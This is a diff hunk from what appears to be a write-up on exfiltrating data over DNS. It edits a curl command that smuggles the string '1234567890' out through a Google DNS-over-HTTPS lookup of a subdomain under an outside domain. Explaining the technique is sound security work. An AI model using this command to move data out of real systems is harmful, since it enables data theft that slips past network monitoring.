@@ -144,7 +144,7 @@ To replicate the previous example and exfiltrate the `1234567890` string we simp
 ```bash
 curl -H 'Accept: application/dns-json' \
      -H 'Host: dns.google' \
-     'https://8.8.8.8/resolve?name=1234567890.iwantmore.pizza&type=A'
+     'https://8.8.8.8/resolve?name=1234567890.exfil.iwantmore.pizza&type=A'
 ```
 
 and we end up with the same result on the server:
